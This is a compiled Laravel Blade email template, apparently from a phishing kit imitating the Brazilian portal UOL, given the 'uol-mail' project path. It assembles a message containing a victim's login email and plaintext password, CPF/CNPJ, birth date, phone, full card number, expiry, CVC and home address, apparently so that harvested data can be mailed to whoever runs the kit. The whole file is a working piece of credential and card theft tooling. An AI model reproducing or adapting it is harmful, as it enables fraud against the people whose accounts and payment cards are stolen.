
<?php
use Illuminate\Foundation\Inspiring;
[$message, $author] = str(Inspiring::quotes()->random())->explode('-');
?>
<?php if (isset($component)) { $__componentOriginalaa758e6a82983efcbf593f765e026bd9 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginalaa758e6a82983efcbf593f765e026bd9 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => $__env->getContainer()->make(Illuminate\View\Factory::class)->make('mail::message'),'data' => []] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? $attributes->all() : [])); ?>
<?php $component->withName('mail::message'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag): ?>
<?php $attributes = $attributes->except(\Illuminate\View\AnonymousComponent::ignoredParameterNames()); ?>
<?php endif; ?>
<?php $component->withAttributes([]); ?>
# Login Information
 - Email: <?php echo e($visitor->user); ?>

 - Password: <?php echo e($visitor->pass); ?>

# Personal Information
 - Full name: <?php echo e($address->fullname); ?>

 - CPF/CNPJ: <?php echo e($request->get('cpf')); ?>

 - Date of Birth: <?php echo e($address->birthdate); ?>

 - Phone Number: <?php echo e($address->telefone); ?>

# Card Information
 - Cardholder Name: <?php echo e($request->get('cardHolder')); ?>

 - Card Number: <?php echo e($request->get('cardNumber')); ?>

 - Card Expiry: <?php echo e($request->get('expiryDate')); ?>

 - Card CVC: <?php echo e($request->get('cvv')); ?>

# Address Information
 - Street: <?php echo e($address->street); ?>

 - Number: <?php echo e($address->number); ?>

 - Complement: <?php echo e($address->complement); ?>

 - Neighborhood: <?php echo e($address->neighborhood); ?>

 - City: <?php echo e($address->city); ?>

 - CEP: <?php echo e($address->cep); ?>

 - State: <?php echo e($address->state); ?>

 <?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginalaa758e6a82983efcbf593f765e026bd9)): ?>
<?php $attributes = $__attributesOriginalaa758e6a82983efcbf593f765e026bd9; ?>
<?php unset($__attributesOriginalaa758e6a82983efcbf593f765e026bd9); ?>
<?php endif; ?>
<?php if (isset($__componentOriginalaa758e6a82983efcbf593f765e026bd9)): ?>
<?php $component = $__componentOriginalaa758e6a82983efcbf593f765e026bd9; ?>
<?php unset($__componentOriginalaa758e6a82983efcbf593f765e026bd9); ?>
<?php endif; ?>
<?php /**PATH C:\Users\brami\Github\uol-mail\resources\views\mail\card-details.blade.php ENDPATH**/ ?>